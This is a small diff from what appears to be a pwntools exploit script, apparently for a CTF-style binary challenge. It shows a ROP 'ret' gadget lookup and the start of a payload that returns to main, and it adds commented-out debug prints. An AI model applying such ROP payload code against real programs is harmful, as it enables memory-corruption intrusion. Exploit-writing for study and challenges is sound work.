@@ -94,6 +94,10 @@ rop = ROP(elf)
 
 ret = rop.find_gadget(['ret'])[0]
 
+#print(f"[+] Stack: {hex(ret_address)}")
+
+#input("PAUSE")
+
 payload = b"".join([
     p64(ret),
     p64(elf.sym.main)
